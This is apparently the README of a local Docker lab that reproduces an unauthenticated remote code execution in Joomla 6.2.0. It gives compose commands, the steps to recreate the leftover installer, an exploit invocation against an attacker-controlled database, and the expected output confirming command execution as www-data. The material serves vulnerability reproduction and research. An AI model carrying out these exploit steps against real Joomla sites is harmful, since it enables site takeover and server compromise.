# Local lab

Disposable Docker lab for **CVE-2026-123214**. It runs Joomla 6.2.0
(vulnerable), a baseline MariaDB, and an attacker-controlled MariaDB on
loopback.

## Requirements

- Docker 24+ with Compose v2
- Python 3.10+
- `curl`

## Quick start

```bash
bash lab/run_local_poc.sh
```

The script:

1. starts the three containers on a random loopback port;
2. installs the baseline site with Joomla's CLI installer as `www-data`;
3. restores `installation/` from the pristine source tree to recreate the
   vulnerable state;
4. runs the standalone exploit against the attacker database with `--cmd id`.

Expected tail:

```
[+] installer directory removed by its own delete task
[+] administrator login: OK
[*] active site template extension id: 245
[+] PHP probe written to the active site template
[+] RCE CONFIRMED (id):
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The script prints the Compose project name and port when it finishes.

## Manual run

```bash
docker compose -p joomla-lab -f lab/compose.yml up -d
```

Wait for both databases to report healthy, then install the baseline site:

```bash
docker compose -p joomla-lab -f lab/compose.yml exec -T -u www-data joomla \
  php /var/www/html/installation/joomla.php install \
  --site-name=Lab --admin-user=Admin --admin-username=labadmin \
  --admin-password='LocalLabAdmin123!' --admin-email=lab@localhost.invalid \
  --db-type=mysqli --db-host=db --db-user=joomla \
  --db-pass=joomla-lab-password --db-name=joomla --db-prefix=lab_ \
  --no-interaction
```

Recreate the leftover installer:

```bash
docker compose -p joomla-lab -f lab/compose.yml exec -T joomla sh -lc \
  'cp -a /usr/src/joomla/installation /var/www/html/installation &&
   chown -R www-data:www-data /var/www/html'
```

Get the attacker database address and run the exploit:

```bash
DB_IP=$(docker inspect joomla-lab-attacker-db-1 \
  --format '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}')

python3 exploit/poc_unauth_rce.py http://127.0.0.1:18080 --exploit \
  --db "$DB_IP:3306" --db-user pwn --db-pass pwn-lab-password \
  --db-name pwn --admin-user attacker --admin-pass 'AttackerPass123!' --yes
```

## Stop and clean up

```bash
docker compose -p joomla-lab -f lab/compose.yml down -v
```

Use the project name printed by the runner if you used `run_local_poc.sh`.

## Notes

- The lab pins `joomla:6.2.0-apache`. Versions 6.2.1+ are fixed.
- `JOOMLA_INSTALLATION_DISABLE_LOCALHOST_CHECK=1` is declared explicitly so the
  installer accepts the attacker database container. Without it,
  `checkRemoteDbHost()` refuses non-local DB hosts — the same gate a generic
  remote host presents.
- The lab is disposable and binds to `127.0.0.1` only. Do not expose it.
